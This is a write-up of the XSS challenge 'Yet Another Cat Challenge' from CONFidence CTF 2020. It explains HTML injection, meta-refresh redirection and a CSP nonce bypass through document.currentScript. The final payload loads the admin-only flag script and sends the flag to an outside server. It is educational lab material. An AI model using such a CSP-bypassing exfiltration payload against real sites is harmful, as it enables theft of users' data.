<h2>Yet Another Yet Another Cat Challenge Part 1/2</h2>

<h3>Description</h3>

<blockquote>Yet Another Cat Challenge for you! Just another boring add/remove/share note app, but with 8 different cats!

http://yayacc.zajebistyc.tf</blockquote>

<p>One day when I was chatting with my friend <a href="https://gynvael.coldwind.pl/">Gynvael</a>, and he told me about a hard XSS challenge from CONFidence CTF 2020 that he faced. So I decided to give it a try and see what is going on. He gave me two hints:</p>
<ol>
 <li><b>HTML injection.</b></li>
 <li><b>Location of XSS should be at theme style selection. (Though there is an intended and an unintended solution; we will cover the intended one in part 2).</b></li>
</ol><br>
<p>So in this challenge after we login, we get to the page where we can add a "note". Looking at the raw HTML we get this:</p>

![addnote](https://github.com/DejanJS/CONFidence-CTF-2020-yayacc/blob/master/entrypage.png)

```javascript
<html>
<head>
    <title>Yet Another Cat Challenge</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
          integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
    <script src="/flag?var=flag" nonce="0vOlzlwTCvS5btb6IkPB1Q"></script>
    <script src="https://www.google.com/recaptcha/api.js?render=6Le09cUZAAAAAN4r7Ushpf0tdpAowD0LNE1gNsHI"></script>
    <script nonce="0vOlzlwTCvS5btb6IkPB1Q">
        window.onload = function()
        {
            document.getElementById('hello').innerText += ' ' + flag;
        }
        grecaptcha.ready(function() {
            grecaptcha.execute('6Le09cUZAAAAAN4r7Ushpf0tdpAowD0LNE1gNsHI', {action:'validate_captcha'})
                  .then(function(token) {
            // add token value to form
            captchas = document.getElementsByName('g-recaptcha-response')
            for(var i = 0; i < captchas.length; i++)
                captchas[i].value = token;
        });
    });
    
    </script>
</head>
<body>
<div id="hello">
    Hello pkellerman, the flag is:
</div>
<ul class="list-group">
    
</ul>
<a href="/note" class="btn btn-primary">Add note</a>
</body>
</html>
```

<p>We can see there is a script tag with src pointing to <code>/flag?var=flag</code>. If we follow that path we obviously won't get the real flag since we are not an admin.<br>If we click Add Note, we get a form with content and cat options to choose. The page HTML source looks like this:</p>

```javascript
<html>
    <head>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
    <script nonce="_uqFLtygAarWEsN-Lmv16g">
    document.scripts[0].remove()
    blackTheme = 'background-color: #000000; color: #ffffff';
    whiteTheme = 'background-color: #eeeeee; color: #111111';    

    // stolen from http://www.yaldex.com/FSBackground/BouncingImage.htm
    var img;

[...]

    function start() {
    img = document.createElement('img');
    img.src = '/static/cats/lusia.png';
    img.style = 'position: absolute; width: 200px';
    document.body.appendChild(img);
    interval = setInterval(changePos,delay);
    document.body.style = whiteTheme;
    }
    window.onload = start;
    </script>
    </head>
    <body>
        <div class="container">
[...]
            <div>
                Theme:
            <a href="?theme=whiteTheme">white</a> <a href="?theme=blackTheme">black</a>
[...]
```

This HTML is sent with the following HTTP response headers: 
<blockquote>

```javascript
Connection: keep-alive
Content-Encoding: gzip
Content-Security-Policy: default-src 'none'; form-action 'self'; frame-ancestors 'none'; style-src https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css; img-src 'self'; script-src 'nonce-VWn7r5GTbTcLZSqYM4JutQ' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/; frame-src https://www.google.com/recaptcha/
content-security-policy: noscript-marker;font-src http:;media-src http:;object-src http:
Content-Type: text/html; charset=utf-8
Date: Wed, 16 Sep 2020 17:40:08 GMT
Server: nginx/1.19.1
Transfer-Encoding: chunked
Vary: Accept-Encoding
Vary: Cookie
X-DNS-Prefetch-Control: off
```
</blockquote>

<p>From all of this we can see a few things: there is a CSP rule with <code>img-src</code> set to 'self' which is only going to allow same origin images, and script-src with unique nonce which is going to allow executing only those scripts that have a valid nonce value (nonce value is random for every request). Looking at the HTML/JS, the selected cat is being added inside of that <code>start()</code> function as img.src, content is being added to container <code>div</code>, and we do have an option to change the theme color from White to Black. We can also either delete the current note or go back and share it with an admin.</p>

<h3>Solution (Unintended)</h3>

<h4><i>Step 1. HTML Injection</i></h4>
<p>First step is the aforementioned HTML injection which we can achieve by changing the cat selection, <code>select</code> tag to either <code>input</code> or <code>textarea</code>. <b>Note that both the intended and unintended solutions will require those steps.</b><br>Inputting various special characters as payload we can see that some of them are not being escaped.

```javascript
img.src = '!"#$%&\&apos;()*+,-./:;<=>?@[\\]^_`{|}~';
```
Those are: slashes, single quotes, backticks, less than and greater than sign, and so on. Single
quote is being escaped as <code>&apos;</code> so injecting JS is not possible.

<h4><i>Step 2. XSS</i></h4>

Since I was given a hint that XSS will be located at the theme selection, let’s try it out:</p>

![theme_xss_example](https://github.com/DejanJS/CONFidence-CTF-2020-yayacc/blob/master/theme_xss_example.png)

<p>It does execute an alert as we see. Now comes the really hard part which is basically connecting the two steps together. We need to redirect the admin to the note where our XSS will trigger, grab the flag and send it to our server.
We know that <b><code>/flag?var=flag</code></b> is only accessible by an admin (or rather to say only admin can see the real flag), we will need to make a note with XSS and share it with the admin to retrieve the flag that is on that endpoint. But problem is that we have CSP in our way. Initially I thought that we can make a request with script and direct the admin to XSS, or how it's usually done through an iframe. CSP isn't going to allow Ajax requests (default-src 'self': fallback , which is the case for iframe as well) to different domains: </p>

<blockquote>
<i>The HTTP Content-Security-Policy (CSP) default-src directive serves as a fallback for the other CSP fetch directives. For each of the following directives that are absent, the user agent looks for the default-src directive and uses this value for it:
<ul>
<li>child-src</li>
<li>connect-src</li>
<li>font-src</li>
<li>frame-src</li>
<li>img-src</li>
<li>manifest-src</li>
<li>media-src</li>
<li>object-src</li>
<li>prefetch-src</li>
<li>script-src</li>
<li>script-src-elem</li>
<li>script-src-attr</li>
<li>style-src</li>
<li>style-src-elem</li>
<li>style-src-attr</li>
<li>worker-src</li>
</ul>
</i>
<p>
<b>'self'</b>
Refers to the origin from which the protected document is being served, including the same URL scheme and port number. You must include the single quotes. Some browsers specifically exclude blob and filesystem from source directives. Sites needing to allow these content types can specify them using the Data attribute.
</p>
</blockquote>

<p>So how are we going to bypass it? Or to be more precise how to make a request without JavaScript and Ajax and direct admin to XSS? This one was pretty hard to figure out, but after talking to Gynvael and doing some research one thing came up:  <code><b>http-equiv="refresh" content="0; URL=..."</b></code>. Pretty interesting that I've forgot about this <b>meta tag</b> attribute: it is actually refreshing the page and can do a redirect, which happens to be exactly what we need.</p>
</p>

<h4><i>Making of the payload</i></h4>

<p>I've created a test "note" and performed an HTML injection that I described above. First we can escape from the script tag where our JavaScript lives by closing script tag at the beginning of the payload, that will successfully bypass single quotes (as mentioned at the beginning of the previous step). With that we are escaping the JavaScript context and we can followup with the refresh meta tag (Step 1 payload example). For example:</p>

```javascript
</script><meta http-equiv="refresh" content="0;URL=http://yayacc.zajebistyc.tf/flag?var=flag">
```
<p>Testing this successfully redirected us to the flag query path which is a good sign.<br>Connecting to Step 2 now, we have to craft an actual XSS script that we will inject in our selected "theme" and share that note with the admin, which in turn will force admin's browser to make a request to our server where we will store the request (and the flag). We know that script will be concatenated to <code>document.body.style</code> because that is where the theme is being set inside that start function (and from our alert example). So creating a new script and appending it to the DOM should be easy, right?<br> Well yea... but not really. There is a hard part: we have to bypass the CSP with that <code>script nonce</code> (only scripts with nonce value will be executed). Though if you scroll up to the start of the script tag you will see the following piece of code on the very next line: <code>document.scripts[0].remove()</code>.<br>I did think it's going be straight forward from here, but it won't because of that line there... Gynvael gave me a hint-by-question: is the script really being removed or is there a reference kept somewhere? And yes there was a reference.<br>The answer to this is: <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/currentScript">document.currentScript<a>.<br>
</p>
<p>In the docs you can find this:</p>

<blockquote>

<i>The Document.currentScript property returns the script element whose script is currently being processed and isn't a JavaScript module. (For modules use import.meta instead.)
It's important to note that this will not reference the script element if the code in the script is being called as a callback or event handler; it will only reference the element while it's initially being processed.
</i>

</blockquote>

<p>That is exactly what we need! The script’s nonce attribute while is being executed, we will grab that nonce and add it to our newly created script with src <code>/flag?var=flag</code>. This way we will have flag as a global variable and we just have to exfiltrate it to our server(and CSP is being annoying again). And this is achievable with <code>document.location</code> which is going to make a GET request to our server with the flag being sent in the query string. </p>
<br>
<p>Now it was enough to  create a new note with some random content, do the HTML injection, and insert the payload as shown below. Meta refresh tag URL is linking to previous note that we've made.</p>

<p>Our final payload should look like this:</p>

```javascript
</script><meta http-equiv="refresh" content="0;URL=http://yayacc.zajebistyc.tf/note/48ab77af-f06d-48d5-a6d2-fba6ddcc8227?theme=`color:red`;}var oldsc=document.currentScript.nonce;var sc =document.createElement(`script`);sc.nonce=oldsc;sc.src=`/flag?var=flag`;document.querySelector(`html`).appendChild(sc);setTimeout(function(){document.location=`https://ctf.warriordev.com/ctfserver/ref?flag=${flag}`},100);{//

```

<b>FLAG:</b>

![flag](https://github.com/DejanJS/CONFidence-CTF-2020-yayacc/blob/master/flag.png)

<h4><i>Diagram</i></h4>
<p>This is just my random drawing to visualize what is going on.</p>

<img src="https://github.com/DejanJS/CONFidence-CTF-2020-yayacc/blob/master/diagram.png" width="1100px" height="700px">

<h4>Summary part 1</h4>
<p>This challenge was complex and has been made in pretty realistic scenario. Props to folks from <a href="https://p4.team/">p4</a> especially <b>sasza</b>. I hope part one of this writeup will help someone to understand wider complexity of XSS attacks, just like writing this down helped me to fully grasp the concepts behind this and to expand my knowledge.</p>

<h3>To be continued...</h3>

